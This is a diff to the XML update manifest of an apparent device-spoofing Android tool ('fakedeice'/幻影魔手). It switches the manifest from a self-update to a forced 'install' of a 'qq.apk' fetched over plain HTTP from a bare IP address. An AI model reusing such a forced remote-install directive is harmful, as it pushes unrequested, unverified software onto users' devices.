@@ -1,15 +1,12 @@
 <update>
 	<version>18</version>
 	<name>fakedeice</name>
-	<mode>update</mode>
+	<mode>install</mode>
 
-	<message>幻影魔手2.8.3：
-        1.幻影魔手2.8.3版本更新
-        2.修复上个版本中误删除账号信息的问题
-        3.添加定位信息更新到历史账号纪录的功能。
+	<message>推送QQ版本安装
 	</message>
-	<url>http://120.26.209.144:8080/Fakedevice/fakedevice.apk</url>
-	<md5>d08b4767c25c19e4d5159af09ee1ab5e</md5>
+	<url>http://120.26.209.144:8080/Fakedevice/qq.apk</url>
+	<md5>1a4f388bc2145af74d595b0ebec85008</md5>
 	<cmd>""</cmd>
 	<updateflag>enforce</updateflag>
 </update>
